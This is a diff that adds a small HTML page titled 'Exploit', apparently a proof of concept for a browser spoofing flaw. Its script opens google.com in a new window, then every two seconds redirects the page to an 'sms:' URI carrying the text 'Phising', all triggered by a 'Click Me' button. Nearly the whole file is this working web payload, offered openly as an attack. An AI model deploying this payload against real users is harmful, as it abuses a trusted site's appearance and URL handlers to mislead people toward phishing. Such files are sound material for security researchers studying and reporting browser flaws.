@@ -1,0 +1,12 @@
+<body>
+<h1>Exploit</h1>
+<script>
+function exploit(){
+  var win = window.open('https://google.com/','');
+  setInterval(function(){
+  location.href = "sms:12345&body=Phising";
+  }, 2000);
+}
+</script>
+<button onclick="exploit()">Click Me</button>
+</body>
